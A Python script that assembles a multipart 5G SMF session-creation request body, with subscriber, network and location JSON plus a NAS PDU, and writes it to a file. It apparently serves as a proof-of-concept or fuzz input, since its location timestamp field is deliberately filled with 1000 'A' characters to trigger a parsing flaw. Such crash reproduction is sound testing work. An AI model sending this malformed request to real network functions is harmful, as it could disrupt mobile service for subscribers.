#!/usr/bin/env python3
import json
from pathlib import Path

boundary = "=-l6HJGqWGrOZyBNBbt/WW9g=="
crlf = b"\r\n"

json_data = {
    "supi": "imsi-460990000000001",
    "pei": "imeisv-4370816125816151",
    "pduSessionId": 1,
    "dnn": "internet",
    "sNssai": {
        "sst": 1
    },
    "servingNfId": "baa00304-25ad-41f1-ad3e-a9e618e691bf",
    "guami": {
        "plmnId": {
            "mcc": "460",
            "mnc": "99"
        },
        "amfId": "020040"
    },
    "servingNetwork": {
        "mcc": "460",
        "mnc": "99"
    },
    "requestType": "INITIAL_REQUEST",
    "n1SmMsg": {
        "contentId": "5gnas-sm"
    },
    "anType": "3GPP_ACCESS",
    "ratType": "NR",
    "ueLocation": {
        "nrLocation": {
            "tai": {
                "plmnId": {
                    "mcc": "460",
                    "mnc": "99"
                },
                "tac": "000001"
            },
            "ncgi": {
                "plmnId": {
                    "mcc": "460",
                    "mnc": "99"
                },
                "nrCellId": "000000010"
            },
            "ueLocationTimestamp": "A" * 1000
        }
    },
    "ueTimeZone": "+08:00",
    "smContextStatusUri": "http://172.22.0.10:7777/namf-callback/v1/imsi-460990000000001/sm-context-status/1",
    "pcfId": "c02fde7a-25ad-41f1-a187-19fb12232e81"
}

nas_pdu = bytes.fromhex(
    "2e0101c1ffff91a12801007b000780000a00000d00"
)

body = b""

body += f"--{boundary}".encode() + crlf
body += b"Content-Type: application/json" + crlf
body += crlf
body += json.dumps(json_data, separators=(",", ":")).encode()
body += crlf

body += f"--{boundary}".encode() + crlf
body += b"Content-Id: 5gnas-sm" + crlf
body += b"Content-Type: application/vnd.3gpp.5gnas" + crlf
body += crlf
body += nas_pdu
body += crlf

body += f"--{boundary}--".encode() + crlf

Path("body.bin").write_bytes(body)

print(f"body.bin written, length={len(body)} bytes")